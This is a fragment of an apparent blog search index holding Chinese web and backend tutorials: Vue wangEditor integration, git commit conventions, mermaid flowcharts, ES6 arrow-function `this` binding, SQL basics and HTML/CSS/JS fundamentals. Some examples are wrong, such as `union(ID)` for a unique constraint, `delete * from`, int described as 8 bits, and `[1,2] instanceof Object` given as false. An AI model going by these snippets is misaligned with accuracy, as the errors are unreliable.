,选择”Registry”,回车,找到”complier.automake.allow.when.app.running”到此全部配置完毕,手动重启一次,修改代码保持即可看到控制台在自动重启]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>Maven</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在 vue.js 中使用 wangEditor 富文本编辑器]]></title>
    <url>%2Farchives%2F28842ff2.html</url>
    <content type="text"><![CDATA[富文本编辑器在后台管理系统中是一个常见而又简单的需求,这里介绍到的是在 vue.js 项目中使用 wangEditor 这一款富文本编辑器wangEditor至于这款编辑器并不想做过多的介绍,自信查阅官方文档官网：www.wangEditor.com 文档：www.kancloud.cn/wangfupeng/wangeditor3/332599结合 Vue.js 项目建立 Vue.js 项目首先该项目是基于 webpack 的一个项目,如果已经是了请忽略vue init webpack demo cd demo npm i 安装 wangEditor 依赖npm install wangeditor 编写组件代码在组件目录下新建 EditorBar.vue,然后就可以编写代码了这边使用菜单与编辑器区域分离作为 demo,这边也列出了在 vue 中常见几种 API 调用方法&lt;template lang=&quot;html&quot;&gt; &lt;div class=&quot;editor&quot;&gt; &lt;div ref=&quot;toolbar&quot; class=&quot;toolbar&quot;&gt; &lt;/div&gt; &lt;div ref=&quot;editor&quot; class=&quot;text&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import E from &#39;wangeditor&#39; export default { name: &#39;Editorbar&#39;, data () { return { editor: null, info_: null } }, model: { prop: &#39;value&#39;, event: &#39;change&#39; }, props: { value: { type: String, default: &#39;&#39; }, isClear: { type: Boolean, default: false } }, watch: { isClear (val) { // 触发清除文本域内容 if (val) { this.editor.txt.clear() this.info_ = null } } }, mounted () { this.seteditor() this.editor.txt.html(this.value) }, methods: { seteditor () { this.editor = new E(this.$refs.toolbar, this.$refs.editor) this.editor.customConfig.uploadImgShowBase64 = true // base 64 存储图片 this.editor.customConfig.uploadImgServer = &#39;&#39;// 配置服务器端地址 this.editor.customConfig.uploadImgHeaders = { }// 自定义 header this.editor.customConfig.uploadFileName = &#39;&#39; // 后端接受上传文件的参数名 this.editor.customConfig.uploadImgMaxSize = 2 * 1024 * 1024 // 将图片大小限制为 2M this.editor.customConfig.uploadImgMaxLength = 6 // 限制一次最多上传 3 张图片 this.editor.customConfig.uploadImgTimeout = 3 * 60 * 1000 // 设置超时时间 // 配置菜单 this.editor.customConfig.menus = [ &#39;head&#39;, // 标题 &#39;bold&#39;, // 粗体 &#39;fontSize&#39;, // 字号 &#39;fontName&#39;, // 字体 &#39;italic&#39;, // 斜体 &#39;underline&#39;, // 下划线 &#39;strikeThrough&#39;, // 删除线 &#39;foreColor&#39;, // 文字颜色 &#39;backColor&#39;, // 背景颜色 &#39;link&#39;, // 插入链接 &#39;list&#39;, // 列表 &#39;justify&#39;, // 对齐方式 &#39;quote&#39;, // 引用 &#39;emoticon&#39;, // 表情 &#39;image&#39;, // 插入图片 &#39;table&#39;, // 表格 &#39;video&#39;, // 插入视频 &#39;code&#39;, // 插入代码 &#39;undo&#39;, // 撤销 &#39;redo&#39; // 重复 ] this.editor.customConfig.uploadImgHooks = { fail: (xhr, editor, result) =&gt; { // 插入图片失败回调 }, success: (xhr, editor, result) =&gt; { // 图片上传成功回调 }, timeout: (xhr, editor) =&gt; { // 网络超时的回调 }, error: (xhr, editor) =&gt; { // 图片上传错误的回调 }, customInsert: (insertImg, result, editor) =&gt; { // 图片上传成功,插入图片的回调 } } this.editor.customConfig.onchange = (html) =&gt; { this.info_ = html // 绑定当前逐渐地值 this.$emit(&#39;change&#39;, this.info_) // 将内容同步到父组件中 } // 创建富文本编辑器 this.editor.create() } } } &lt;/script&gt; &lt;style lang=&quot;css&quot;&gt; .editor { width: 80%; margin: 0 auto; } .toolbar { border: 1px solid #ccc; } .text { border: 1px solid #ccc; height: 500px; } &lt;/style&gt; 编辑父组件代码&lt;template lang=&quot;html&quot;&gt; &lt;div&gt; &lt;editor-bar v-model=&quot;editor.info&quot; :isClear=&quot;isClear&quot; @change=&quot;change&quot;&gt;&lt;/editor-bar&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import EditorBar from &#39;@/components/EditorBar&#39; export default { data () { return { editor: { info: &#39;&#39; }, isClear: false } }, methods: { change (val) { this.editor.info1 = val } }, components: { EditorBar } } &lt;/script&gt;]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git commit 规范指南]]></title>
    <url>%2Farchives%2Ffdd4f330.html</url>
    <content type="text"><![CDATA[目前,社区有多种 Commit message 的写法规范。本文介绍 Angular 规范 是目前使用最广的写法,比较合理和系统化,并且有配套的工具。前前端框架 Angular.js 采用的就是该规范Commit message 的作用提供更多的历史信息,方便快速浏览。比如,下面的命令显示上次发布后的变动,每个 commit 占据一行。你只看行首,就知道某次 commit 的目的。git log &lt;last tag&gt; HEAD --pretty=format:%s 可以过滤某些 commit（比如文档改动）,便于快速查找信息git log &lt;last release&gt; HEAD --grep feature 可以直接从 commit 生成 Change logChange Log 是发布新版本时,用来说明与上一个版本差异的文档,详见后文其他优点可读性好,清晰,不必深入看代码即可了解当前 commit 的作用。为 Code Reviewing 做准备方便跟踪工程历史让其他的开发者在运行 git blame 的时候想跪谢提高项目的整体质量,提高个人工程素质Commit message 的格式每次提交,Commit message 都包括三个部分：header,body 和 footer。&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt; &lt;BLANK LINE&gt; &lt;body&gt; &lt;BLANK LINE&gt; &lt;footer&gt; 其中,header 是必需的,body 和 footer 可以省略。 不管是哪一个部分,任何一行都不得超过 72 个字符（或 100 个字符）。这是为了避免自动换行影响美观。HeaderHeader 部分只有一行,包括三个字段：type（必需）、scope（可选）和 subject（必需）。type用于说明 commit 的类别,只允许使用下面 7 个标识。feat：一项新功能fix：修复一个 bugdocs：仅仅修改文档（documentation）style： 不影响代码含义的更改（空格,格式,缺少分号等）refactor：重构（即不是新增功能,也不是修改 bug 的代码变动）perf: 改进性能的代码更改test: 添加缺失测试或更正现有测试build: 影响构建系统或外部依赖项的更改（示例范围：gulp,broccoli,npm）ci: 对CI配置文件和脚本的更改（示例范围：Travis,Circle,BrowserStack,SauceLabs）chore：其他不修改src或测试文件的更改revert: 恢复之前的提交（即回滚）如果 type 为 feat 和 fix,则该 commit 将肯定出现在 Change log 之中。其他情况（docs、chore、style、refactor、test）由你决定,要不要放入 Change log,建议是不要。scopescope 用于说明 commit 影响的范围,比如数据层、控制层、视图层等等,视项目不同而不同。例如在 Angular,可以是 $location, $browser, $compile, $rootScope, ngHref, ngClick, ngView 等。如果你的修改影响了不止一个 scope,你可以使用 * 代替。subjectsubject 是 commit 目的的简短描述,不超过 50 个字符。其他注意事项：以动词开头,使用第一人称现在时,比如 change,而不是 changed 或 changes第一个字母小写结尾不加句号（.）BodyBody 部分是对本次 commit 的详细描述,可以分成多行。下面是一个范例。More detailed explanatory text, if necessary. Wrap it to about 72 characters or so. Further paragraphs come after blank lines. * Bullet points are okay, too * Use a hanging indent 有两个注意点:使用第一人称现在时,比如使用 change 而不是 changed 或 changes。永远别忘了第 2 行是空行应该说明代码变动的动机,以及与以前行为的对比。FooterFooter 部分只用于以下两种情况：不兼容变动如果当前代码与上一个版本不兼容,则 Footer 部分以 BREAKING CHANGE 开头,后面是对变动的描述、以及变动理由和迁移方法。BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: { myAttr: &#39;attribute&#39;, } After: scope: { myAttr: &#39;@&#39;, } The removed `inject` wasn&#39;t generaly useful for directives so there should be no code using it. 关闭 Issue如果当前 commit 针对某个 issue,那么可以在 Footer 部分关闭这个 issue 。Closes #234 Revert还有一种特殊情况,如果当前 commit 用于撤销以前的 commit,则必须以 revert:开头,后面跟着被撤销 Commit 的 Header。revert: feat(pencil): add &#39;graphiteWidth&#39; option This reverts commit 667ecc1654a317a13331b17617d973392f415f02. Body 部分的格式是固定的,必须写成 This reverts commit &lt;hash&gt;.,其中的 hash 是被撤销 commit 的 SHA 标识符。如果当前 commit 与被撤销的 commit,在同一个发布（release）里面,那么它们都不会出现在 Change log 里面。如果两者在不同的发布,那么当前 commit,会出现在 Change log 的 Reverts 小标题下面。Commitizen可以使用典型的 git 工作流程或通过使用 CLI 向导 Commitizen 来添加提交消息格式。安装npm install -g commitizen 然后,在项目目录里,运行下面的命令,使其支持 Angular 的 Commit message 格式。commitizen init cz-conventional-changelog --save --save-exact 以后,凡是用到 git commit 命令,一律改为使用 git cz。这时,就会出现选项,用来生成符合格式的 Commit message。生成 Change log如果你的所有 Commit 都符合 Angular 格式,那么发布新版本时, Change log 就可以用脚本自动生成。生成的文档包括以下三个部分：New features Bug fixes Breaking changes. 每个部分都会罗列相关的 commit ,并且有指向这些 commit 的链接。当然,生成的文档允许手动修改,所以发布前,你还可以添加其他内容。conventional-changelog 就是生成 Change log 的工具,运行下面的命令即可。npm install -g conventional-changelog-cli cd my-project conventional-changelog -p angular -i CHANGELOG.md -s -r 0 当然你也可以在你的 package.json 中添加快捷 script{ &quot;script&quot;: { &quot;changelog&quot;: &quot;conventional-changelog -p angular -i src/CHANGELOG.md -s -r 0&quot; } }]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 Markdown 生成流程图]]></title>
    <url>%2Farchives%2Fba2565b0.html</url>
    <content type="text"><![CDATA[当撰写文档的时候,对于流程图的生成大多使用 Visio 等繁重的工具,没有一种轻便的工具能够画图从而简化文档的编写,就像 markdown 那样。mermaid 解决这个痛点,这是一个类似 markdown 语法的脚本语言,通过 JavaScript 实现图表的生成。mernaidmernaid 官方文档流程图(flowchart)graph LR A --&gt; B A --&gt; C B --&gt; D C --&gt; D graph LR A --> B A --> C B --> D C --> DGraphgraph LR A --&gt; B graph LR A --> B这是申明一个由左到右,水平向右的图。 可能方向有：TB - top bottomBT - bottom topRL - right leftLR - left rightTD - same as TB节点与形状默认节点graph LR id1 graph LR id1注意：’id1 ‘显示在节点内部。文本节点graph LR id[This is the text in the box] graph LR id[This is the text in the box]圆角节点graph LR id(This is the text in the box) graph LR id(This is the text in the box)圆节点graph LR id((This is the text in the box)) graph LR id((This is the text in the box))非对称节点graph LR id{This is the text in the box} graph LR id{This is the text in the box}连接线箭头形连接graph LR A --&gt; B graph LR A --> B开放行连接graph LR A --- B graph LR A --- B标签连接graph LR A -- This is the label text --- B graph LR A -- This is the label text --- B箭头标签连接graph LR A --&gt;|This is the label text| B C -- This is the label text --&gt; D graph LR A -->|This is the label text| B C -- This is the label text --> D虚线连接graph LR A -.-&gt; B C -.- D graph LR A -.-> B C -.- D标签虚线graph LR A -.This is the label text.-&gt; B C -.This is the label text.- D E -.-&gt;|This is the label text| F graph LR A -.This is the label text.-> B C -.This is the label text.- D E -.->|This is the label text| F]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 ES6 写 jquery 语法时的 this 绑定问题]]></title>
    <url>%2Farchives%2F13b5650d.html</url>
    <content type="text"><![CDATA[在 es6 里使用 jquery 时,习惯用 es5 中直接获取 dom 元素,如 $(‘selector’), 绑 定 click 或 hover 等事件;若你也追求潮流,在选择器事件中使用箭头函数来定义,并用到 $(this) 的话,那么你会发现这完全行不通,想要知道解决方案的话就继续阅读下去问题重现$(&#39;[data-action=&quot;imgQRCodeCtrl&quot;]&#39;) .hover( () =&gt; { !Base.browser.mobile &amp;&amp; $(this) .find(&quot;.qr-code&quot;) .css({ height: $(this) .find(&quot;.img&quot;) .height() + 2 + &quot;px&quot;, opacity: 1, &quot;z-index&quot;: 1 }); }, () =&gt; { $(this) .find(&quot;.qr-code&quot;) .css({ opacity: 0, &quot;z-index&quot;: -1 }); } ) .click(() =&gt; { if (Base.browser.mobile) { location.href = $(this).data(&quot;href&quot;); } }); 乍一看,这段代码没什么问题,逻辑也很简单,就是在所有属性有 data-action=&quot;imgQRCodeCtrl&quot; 的列表元素上绑定 hover 及 click 事件,实现 pc 端 hover 时能够使内部的一个块显示或隐藏,移动端点击时获取当前属性上的 href 并进行跳转；当然 so easy,在过去的 es5 上按这种逻辑写完全么有问题；but ES6 里解析后,会重新定义 this,如下是真实浏览器上加载的解析后的代码：var $ = __webpack_require__(&quot;./node_modules/jquery/dist/jquery.js&quot;); $(function() { var _this = this; //.... $(&#39;[data-action=&quot;imgQRCodeCtrl&quot;]&#39;) .hover( function() { !_base2.default.browser.mobile &amp;&amp; $(_this) .find(&quot;.qr-code&quot;) .css({ height: $(_this) .find(&quot;.img&quot;) .height() + 2 + &quot;px&quot;, opacity: 1, &quot;z-index&quot;: 1 }); }, function() { $(_this) .find(&quot;.qr-code&quot;) .css({ opacity: 0, &quot;z-index&quot;: -1 }); } ) .click(function() { if (_base2.default.browser.mobile) { location.href = $(_this).data(&quot;href&quot;); } }); }); 原因这是 Stack Overflow 上大牛的解读This has nothing to do with Traceur and turning something off, this is simply how ES6 works. It’s the specific functionality you’re asking for by using =&gt; instead of function () { }.If you want to write ES6, you need to write ES6 all the time, you can’t switch in and out of it on certain lines of code, and you definitely cannot suppress or alter the way =&gt; works. Even if you could, you would just wind up with some bizarre version of JavaScript that only you understand and which would never work correctly outside of your customized Traceur, which definitely isn’t the point of Traceur.以上大概意思是 “ES6 的工作方式就是这样,跟编译无关,与写法有关；若想用 ES6,最好全用 ES6 的写法,不能改变它原本的定义…”原来箭头函数,不绑定自己的 this,这一下就说通了；好好看看下面这句吧,不遇到问题时永远记忆模糊,哈哈箭头函数表达式的语法比函数表达式更短,并且不绑定自己的 this,arguments,super 或 new.target。这些函数表达式最适合用于非方法函数,并且它们不能用作构造函数。问题解决方法一绑定 this 的函数不使用箭头函数不就行了$(&#39;[data-action=&quot;imgQRCodeCtrl&quot;]&#39;) //... .click(function() { if (Base.browser.mobile) { location.href = $(this).data(&quot;href&quot;); } }); 方法二不使用 this, 使用 event.currentTarget$(&#39;[data-action=&quot;imgQRCodeCtrl&quot;]&#39;) //... .click(event =&gt; { if (Base.browser.mobile) { location.href = $(event.currentTarget).data(&quot;href&quot;); } }); 方法三利用 each 函数循环绑定到每一个小元素上,如此就不需要 this 了$(&#39;[data-action=&quot;imgQRCodeCtrl&quot;]&#39;).each((index, element) =&gt; { let _this = element; $(_this).click(() =&gt; { if (Base.browser.mobile) { location.href = $(_this).data(&quot;href&quot;); } }); });]]></content>
      <categories>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL 语法基础]]></title>
    <url>%2Farchives%2Faf7cb3d4.html</url>
    <content type="text"><![CDATA[整理了下 SQL 语法基础,适用于 SQL server 和 MySQL,本博文皆为实例 SQL 语句仅供参考概念基本概念数据库中的行称作元组、记录数据库中的列称作属性、字段常见数据库模型 层次模型 网状模型 关系模型 对象关系模型 对象模型表约束主键约束（Primay Key Coustraint） 唯一性,非空性唯一约束 （Unique Counstraint）唯一性,可以空,但只能有一个检查约束 (Check Counstraint) 对该列数据的范围、格式的限制（如：年龄、性别等）默认约束 (Default Counstraint) 该数据的默认值外键约束 (Foreign Key Counstraint) 需要建立两表间的关系并引用主表的列CURD创建（Create）更新（Update）读取（Retrieve）删除（Delete）数据库创建create database dbxx on ( name=dd1,filename=&quot;c:\dd\dd1.mdf&quot;, maxsize=unlimited,filegrowth=10% ), filegroup xx ( name=dd2,filename=&quot;c:\dd\dd2,mdf&quot;, maxsize=unlimited ), ( name=dd3,filename=&quot;d:\dd\dd3.ndf&quot;, size=50MB,maxsize=unlimited,filegrowth=10MB ) log on ( name=LLg,filename=&quot;d:\dd\ll.;df&quot;, size=10MB,maxsize=50MB,filegrowth=20MB ) 删除use master drop database dbxx 表create table Student ( stuNo int, stuName varchar(10), sex char(2), dep varchar(20), ID char(18), weight decimal(4, 1) ) 常用数据类型数据类型说明int整数,8 位约束主键约束-- 添加约束 alter table Student add constraint PK_S1 primary key(stuNo) -- 删除约束 alter table Student drop constraint PK_S1 唯一约束-- 添加约束 alter table Student add constraint UN_S2 union(ID) -- 删除约束 alter table Student drop constraint UN_S2 默认约束-- 添加约束 alter table Student add constraint DF_S3 default(&#39;男&#39;) for sex -- 删除约束 alter table Student drop constraint DF_S3 检查约束-- 创建约束 alter table Student add constraint CK_S4 check(sex=&#39;男&#39; or sex=&#39;女&#39;) -- 删除约束 alter table Student drop constraint CK_S4 外键约束-- 创建约束 alter table Student add constraint FK_S5 foreign key(stuNo) stuInfo(stuID) -- 删除约束 alter table Student drop constraint FK_S5 删除-- 删表之前一定要先把外键约束先删掉 drop table Student -- 删除表中的某一列 alter table Student drop column dep -- 删除指定数据 delete from Student where dep=&quot;信息系&quot; -- 逐行删除 delete * from Student -- 按条件删除 delete * from Student where sex=&#39;男&#39; -- 快速删除表数据 truncate table Student 更新-- 新增数据 insert into Student values (123096832,&#39;张三&#39;,&#39;男&#39;,&#39;外语系&#39;,350181123401021298) -- 更新数据 update table Student set stuName=&#39;张三&#39; where stuNo=&#39;1013141516&#39; 查询select * from Student select all sex from Student select distinct sex from Student -- 过滤重复 select top 3 percent * from Student -- 前 3% 条 select top 3 * from Student -- 前 3 条 -- 根据某一列查询 select top 3 with ties weight from Student order by weight asc -- 排序。默认升序 select * from Student order by name select * from Student order by name desc -- 降序 select * from Student order by name asc -- 升序 统计假设 Student 表中共有 20 行记录,其中有效性别行数为 18select count(*) from Student -- 返回值 20,返回行为 1 select count(sex) from Student -- 返回值 18,不会统计 NULL,返回行为 1 select count(distinct sec) from Student -- 返回值 2,计算不重复的,返回行为 1 select count(weight), weight from Student group by weight having weight is not null]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB 技术基础知识点]]></title>
    <url>%2Farchives%2F40b53b2c.html</url>
    <content type="text"><![CDATA[WEB 技术基础知识点（包含：HTML、CSS、JavaScript 三大块知点点集合）HTML常见单标记和双标记的基础用法单标记img&lt;img src=&quot;&quot; alt=&quot;&quot;&gt; src =&gt; 资源文件地址alt =&gt; 资源文件未找到时,显示的文本信息常见图片文件格式：GIF、JPEG、PNG、JPG、BMP大小比较：通常地,PNG ≈ JPG &gt; GIF；透明性：PNG &gt; GIF &gt; JPG；色彩丰富程度：JPG &gt; PNG &gt;GIF；兼容程度：GIF ≈ JPG &gt; PNG；(JPEG、BMP 使用的比肩少,这里不做比较hr&lt;hr align=&quot;&quot; size=&quot;&quot; width=&quot;&quot;&gt; align =&gt; center/left/right(对齐方式)size =&gt; 高度,即粗细width =&gt; 宽度input&lt;input name=&quot;&quot; value=&quot;&quot; type=&quot;&quot; placeholder=&quot;&quot; required&gt; name =&gt; 传与后端指定的参数名value =&gt; 输入框的值type =&gt; button/checkbox/file/hidden/image/password/radio/reset/submit/text(类型)placeholder =&gt; 默认文本提示信息required =&gt; 指定必填项这里只摘取重点属性,其他属性用法参照 HTML input 标签link&lt;link rel=&quot;stylesheet&quot; src=&quot;&quot;&gt; src =&gt; 资源文件地址meta&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; 更多详细针对 HTML5 移动端头部标签 的介绍embed&lt;embed src=&quot;&quot; width=&quot;&quot; height=&quot;&quot;&gt; src =&gt; 资源文件地址width =&gt; 嵌入内容的宽度height =&gt; 嵌入内容的高度其他&lt;br/&gt;双标记a&lt;a href=&quot;&quot; title=&quot;&quot; target=&quot;&quot;&gt;&lt;/a&gt; href =&gt; URL,http://[hostName]/[fileName]?[param]=[value] 或者 https://[hostName]/[fileName]?[param]=[value] 或者 //[hostName]/[fileName]?[param]=[value](SEO 优化中推荐使用)title =&gt; 提示文本target_blank =&gt; 浏览器总在一个新打开、未命名的窗口中载入目标文档。_self =&gt; 这个目标的值对所有没有指定目标的 &lt;a&gt; 标签是默认目标,它使得目标文档载入并显示在相同的框架或者窗口中作为源文档。这个目标是多余且不必要的,除非和文档标题 &lt;base&gt; 标签中的 target 属性一起使用。_parent =&gt; 这个目标使得文档载入父窗口或者包含来超链接引用的框架的框架集。如果这个引用是在窗口或者在顶级框架中,那么它与目标 _self 等效。_top =&gt; 这个目标使得文档载入包含这个超链接的窗口,用 _top 目标将会清除所有被包含的框架并将文档载入整个浏览器窗口。ul,ol,dlul =&gt; 无序列表&lt;ul type=&quot;&quot; start=&quot;&quot;&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; ol =&gt; 无序列表&lt;ol type=&quot;&quot; start=&quot;&quot;&gt; &lt;li&gt;&lt;/li&gt; &lt;/ol&gt; dl =&gt; 定义列表&lt;dl type=&quot;&quot; start=&quot;&quot;&gt; &lt;dt&gt;&lt;/dt&gt; &lt;/dl&gt; typedisc =&gt; 默认值。实心圆。circle =&gt; 空心圆。square =&gt; 实心方块1/a/A/i/I =&gt; 自定义,只针对有序列表start =&gt; 起始table&lt;table cellspacing=&quot;&quot; cellpadding=&quot;&quot; border=&quot;&quot; width=&quot;&quot; align=&quot;&quot;&gt; &lt;caption&gt;&lt;/caption&gt; &lt;tr rowspan=&quot;&quot; colspan=&quot;&quot;&gt; &lt;th&gt;&lt;/th&gt; &lt;/tr&gt; &lt;tr align=&quot;&quot;&gt; &lt;td rowspan=&quot;&quot; colspan=&quot;&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; cellspacing =&gt; 单元格与单元格之间的距离cellpadding =&gt; 单元格与内容之间的距离border =&gt; 表格边框线的粗细width =&gt; 表格宽度aligin =&gt; center/left/right/justify(对齐方式)来个例子课程表form&lt;form action=&quot;&quot; method=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;个人信息 &lt;/legend&gt; &lt;div&gt; &lt;label for=&quot;&quot;&gt;&lt;/label&gt; &lt;input name=&quot;&quot; value=&quot;&quot; placeholder=&quot;&quot; required id=&quot;&quot; type=&quot;&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;select name=&quot;&quot;&gt; &lt;option value=&quot;&quot;&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div&gt; &lt;textarea name=&quot;&quot; rows=&quot;&quot; cols&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div&gt; &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt; &lt;button type=&quot;reset&quot;&gt;重置&lt;/button&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;/form&gt; action =&gt; 提交至后端地址method =&gt; get/post(指定发包方式)来个例子表单其他&lt;h1&gt;&lt;/h1&gt; ~ &lt;h6&gt;&lt;/h6&gt;&lt;span&gt;&lt;span&gt;&lt;div&gt;&lt;/div&gt;常见行内标记、块级标记行内标记spaninputimgabfontlabelselect块级标记divph1 ~ h6ul/ol/dthrform标准 HTML 模板&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 这里是注释信息 --&gt; &lt;script src=&quot;&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; CSS这里只列出可以合并写法的一些 CSS 属性盒子模型所有 HTML 元素可以看作盒子,在 CSS 中,”box model”这一术语是用来设计和布局时使用。CSS 盒模型本质上是一个盒子,封装周围的 HTML 元素,它包括：边距,边框,填充,和实际内容。盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。Margin(外边距) - 清除边框外的区域,外边距是透明的。Border(边框) - 围绕在内边距和内容外的边框。Padding(内边距) - 清除内容周围的区域,内边距是透明的。Content(内容) - 盒子的内容,显示文本和图像。class、idclass =&gt; 可以有多个,使用 .[className] 表示 id =&gt; 只能写一个,不能重复,使用 #[idName] 表示&lt;div class=&quot;div1&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt; .div1 { } #div2 { } margin、padding.content { margin: top right bottom left; padding: top right bottom left; } 只有一个值的时候,表示四个方位都设置为该值；只有两个值的时候,分别表示上下、左右；只有三个值；分别表示上、左右、下；有四个值的时候,分别表示上、右、下、左border.content { border: width style color; } border-styledotted =&gt; 定义点状边框dashed =&gt; 定义虚线solid =&gt; 定义实线double =&gt; 定义双线background.content { background: image repeat position attachment; } background-repeatrepeat-x =&gt; 只在 X 轴上重复repeat-Y =&gt; 只在 Y 轴上重复repeat =&gt; 重复（默认值）no-repat =&gt; 不重复background-position =&gt; left/right/botton/centerbackground-attachment =&gt; 是否不跟着文档滚动而滚动fixed =&gt; 不滚动scroll =&gt; 滚动font.content { font: style weight size/line-height family; } font-style =&gt; italic/obliquefont-weight =&gt; 粗细,bold 或者数字font-family =&gt; 字体风格,空格分隔（最好英文）positionabsolute =&gt; 生成绝对定位的元素,相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。fixed =&gt; 生成绝对定位的元素,相对于浏览器窗口进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。relative =&gt; 生成相对定位的元素,相对于其正常位置进行定位。CSS 选择器这里有详细介绍 CSS 选择器介绍引入 css可以分为三种内联样式表&lt;p style=&quot;font-size:&#39;16px&#39;&quot;&gt;测试&lt;/p&gt; 内部样式表&lt;p&gt;测试测试&lt;/p&gt; &lt;style type=&quot;text/css&quot;&gt; p:first-line { background-color: #dedede; } &lt;/style&gt; 外部样式表&lt;link rel=&quot;stylesheet&quot; src=&quot;&quot;&gt; &lt;!-- 或者 --&gt; &lt;style&gt; @import &#39;&#39;;/* 这里只能有一个导入语句,不可再添加其他自定义的 css 语句 */ &lt;/style&gt; 其优先级 =&gt; 内联样式表 &gt; 内部样式表 &gt; 外部样式表标准 CSS 样式表模板推荐写 CSS 的时候要将浏览器一些默认样式清掉@charset &#39;UTF-8&#39; /* 这里是注释信息 */ * { margin: 0; padding: 0; } body, html { font-size: 16px; background-color: #fff; color: #000; } 布局方式div+css 布局, 例子flexbox 布局, flexbox 布局JavaScript嵌入 JavaScript&lt;script src=&quot;&quot;&gt; // 这里不得写自定义代码 &lt;/script&gt; &lt;script&gt; alert(&quot;Hello !!&quot;) &lt;/script&gt; 定义变量不得以数字开头, 可以是 数字,字母,_,$ 的组合, 不能是关键字数据类型numberstringbooleanobjectfunction可以使用 typeof 运算符来判断一个变量的数据类型typeof 1;// number typeof &quot;a&quot;;// string typeof true;// boolean typeof [&quot;1&quot;];// object typeof alert;// function 可以使用 instanceof 运算符来判断一个变量是否为 Array 或者 Object{&quot;k1&quot;:&quot;v1&quot;} instanceof Array // false {&quot;k1&quot;:&quot;v1&quot;} instanceof Object // true [1,2] instanceof Array // true [1,2] instanceof Object // false 可以使用 Number 方法返回变量是否为数字Number(1);// 1 Number(&quot;a&quot;);// NaN Number(&quot;1&quot;);// 1 Number(&quot;1a&quot;);// NaN 算术运算符++ =&gt; i++ 相当于 i = i + 1, 先赋值后自加;++i, 先自加后赋值-- =&gt; 同理上+-*/%+= =&gt; i += 2 相当于 i = i + 2-= =&gt; 同理上*= =&gt; 同理上/= =&gt; 同理上%/ =&gt; 同理上逻辑运算符&amp;&amp; =&gt; 与, 运算符两边皆成立,即返回 true,否则返回 false|| =&gt; 或, 运算符两边成立一边,即返回 true,否则返回 false! =&gt; 非alert/confirm/promptalert(&quot;hello&quot;); if (confirm(&quot;你确定提交吗？&quot;)) { alert(&quot;点击了确定&quot;); } else { alert(&quot;点击了取消&quot;); } var name = prompt(&quot;请输入您的名字&quot;, &quot;&quot;); if (name) { alert(&quot;欢迎您：&quot; + name); } functionfunction num(a, b) { return a + b; } document.write(num(1, 2));// 3 setTimeout/setIntervalsetTimeout 只会调用一次, 使用 clearTimeout 清掉定时器setInterval 无限调用, 使用 clearInterval 清掉定时器setTimeout(&quot;alert(&#39;5 seconds!&#39;)&quot;, 5000); setInterval(&quot;alert(&#39;5 seconds!&#39;)&quot;, 5000); 来个例子, 时钟DOM 事件JavaScript 中的 DOM 事件BOM 对象浏览器对象模型Array数组的定义var arr = []var arr = new Array()var arr = new Array(10)var arr = [1, &#39;1&#39;, true]var arr = new Array(1, &#39;1&#39;, true)注意: typeof new Array(1, &#39;1&#39;, true) 返回的是 object常用属性和方法length =&gt; 数组的长度concat() =&gt; 拼接数组sort() =&gt; 排序arr.sort(funtion (a, b) { return b - a;}) // 降序,从大到小 arr.sort(funtion (a, b) { return a - b;}) // 升序,从小到大 toString() =&gt; 转化为字符串reverse() =&gt; 颠倒顺序push() =&gt; 向数组中添加元素pop() =&gt; 删除数组中最后一个元素shift() =&gt; 删除数组中第一个元素更多属性方法的使用, 参照 JavaScript Array 对象String字符串定义var str = &quot;string&quot;var str = String(&quot;String&quot;)var str = new String(&quot;String&quot;)注意: typeof String(&quot;String&quot;) 返回的是 string, 而 typeof new String(&quot;String&quot;) 返回的是 object常用属性和方法length =&gt; 字符串的长度split() =&gt; 字符串根据某个字符串分割成数组concat() =&gt; 拼接字符串indexOf() =&gt; 返回指定字符在字符串的位置,未找到返回 -1lastIndexOf() =&gt; 